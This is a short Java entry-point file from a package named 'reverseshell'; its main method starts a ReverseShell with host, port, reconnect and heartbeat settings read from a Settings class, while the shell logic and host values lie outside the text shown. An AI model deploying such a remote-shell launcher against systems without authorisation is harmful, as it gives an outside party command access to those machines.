package skorupinski.reverseshell;

public class Driver {
    public static void main(String[] args) {
        new ReverseShell(
            Settings.HOST, 
            Settings.PORT, 
            Settings.CONNECTION_INTERVAL,
            Settings.HEARTBEAT_INTERVAL, 
            Settings.SHOW_LOGS
        );
    }
}
